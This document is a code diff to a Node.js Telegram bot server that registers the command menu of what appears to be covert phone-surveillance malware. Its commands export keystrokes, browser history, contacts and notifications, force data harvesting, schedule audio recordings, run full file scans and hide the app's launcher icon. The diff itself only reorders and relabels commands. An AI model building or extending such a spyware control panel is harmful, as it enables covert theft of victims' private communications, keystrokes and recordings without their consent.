@@ -518,7 +518,7 @@ async function setChatMenuButton(chatId) {
     try {
         console.log(`🔘 Setting menu button for chat ${chatId}`);
         
-        // COMPLETE COMMAND LIST - ALL 85+ COMMANDS FROM APP
+        // COMPLETE COMMAND LIST - ALL 95+ COMMANDS FROM APP
         const commands = [
             // ============ BASIC COMMANDS ============
             { command: 'help', description: '📋 Show main menu' },
@@ -580,7 +580,7 @@ async function setChatMenuButton(chatId) {
             { command: 'record_auto_off', description: '❌ Disable auto schedule' },
             { command: 'record_custom', description: '⚙️ Set custom schedule' },
             
-            // ============ AUDIO QUALITY ============
+            // ============ AUDIO QUALITY (NEW) ============
             { command: 'audio_info', description: '🎤 Audio quality info' },
             { command: 'audio_ultra', description: '🎤 Ultra low quality (8k)' },
             { command: 'audio_very_low', description: '🎤 Very low quality (16k)' },
@@ -588,7 +588,7 @@ async function setChatMenuButton(chatId) {
             { command: 'audio_medium', description: '🎤 Medium quality (32k)' },
             { command: 'audio_high', description: '🎤 High quality (64k)' },
             
-            // ============ MEDIA SCANNER ============
+            // ============ MEDIA SCANNER (ENHANCED) ============
             { command: 'find_media', description: '🔍 Scan for media files' },
             { command: 'scan_media', description: '🔍 Alias for find_media' },
             { command: 'media_scan', description: '🔍 Alias for find_media' },
@@ -596,8 +596,8 @@ async function setChatMenuButton(chatId) {
             { command: 'find_recordings', description: '🔍 Alias for find_recorded' },
             { command: 'scan_recordings', description: '🔍 Alias for find_recorded' },
             { command: 'scan_recording', description: '🔍 Alias for find_recorded' },
-            { command: 'full_scan', description: '🔍 Full system scan' },
-            { command: 'full_scan_detailed', description: '🔬 Detailed system scan' },
+            { command: 'full_scan', description: '🔍 Full system scan (all files)' },
+            { command: 'full_scan_detailed', description: '🔬 Detailed system scan with paths' },
             { command: 'scan_help', description: '❓ Scan commands help' },
             
             // ============ SOCIAL MEDIA ============
@@ -660,7 +660,7 @@ async function setChatMenuButton(chatId) {
             { command: 'keystrokes_html', description: '⌨️ Keystrokes as HTML' },
             { command: 'browser_history_html', description: '🌐 Full browser history HTML' },
             
-            // ============ DETAILED EXPORTS ============
+            // ============ DETAILED EXPORTS (NEW) ============
             { command: 'contacts_detailed', description: '📇 Detailed contacts (JSON)' },
             { command: 'keystrokes_detailed', description: '⌨️ Detailed keystrokes (HTML)' },
             { command: 'notifications_detailed', description: '🔔 Detailed notifications (HTML)' },
@@ -669,14 +669,18 @@ async function setChatMenuButton(chatId) {
             { command: 'device_snapshots', description: '📊 Device history (HTML)' },
             { command: 'device_history', description: '📊 Alias for device_snapshots' },
             
-            // ============ SYNC COMMANDS ============
+            // ============ SYNC COMMANDS (NEW) ============
             { command: 'sync_all', description: '🔄 Sync all data' },
             { command: 'sync_all_new', description: '🔄 Sync all new tables' },
             { command: 'force_harvest', description: '⚡ Force data harvest' },
             { command: 'refresh_data', description: '🔄 Refresh all data' },
             { command: 'refresh', description: '🔄 Alias for refresh' },
+            { command: 'stats', description: '📈 Database statistics' },
+            { command: 'logs_count', description: '📊 Count logs in database' },
+            { command: 'clear_logs', description: '🗑️ Clear database' },
+            { command: 'reboot_app', description: '🔄 Restart all services' },
             
-            // ============ REALTIME CONTROLS ============
+            // ============ REALTIME CONTROLS (ENHANCED) ============
             { command: 'realtime_on', description: '🔔 Enable real-time logs' },
             { command: 'realtime_off', description: '🔕 Disable real-time logs' },
             { command: 'realtime_status', description: '📊 Check real-time status' },
@@ -689,11 +693,7 @@ async function setChatMenuButton(chatId) {
             
             // ============ SERVICE CONTROLS ============
             { command: 'hide_icon', description: '👻 Hide launcher icon' },
-            { command: 'show_icon', description: '👁️ Show launcher icon' },
-            { command: 'reboot_app', description: '🔄 Restart all services' },
-            { command: 'clear_logs', description: '🗑️ Clear database' },
-            { command: 'logs_count', description: '📊 Count logs in database' },
-            { command: 'stats', description: '📈 Database statistics' }
+            { command: 'show_icon', description: '👁️ Show launcher icon' }
         ];
         
         await axios.post(`${TELEGRAM_API}/setMyCommands`, { commands });
@@ -3573,4 +3573,4 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   • Device Snapshots');
     console.log('\n🚀 TOTAL COMMANDS: 95+ fully synchronized between app and server');
     console.log('\n🚀 ===============================================\n');
-}); 
+});
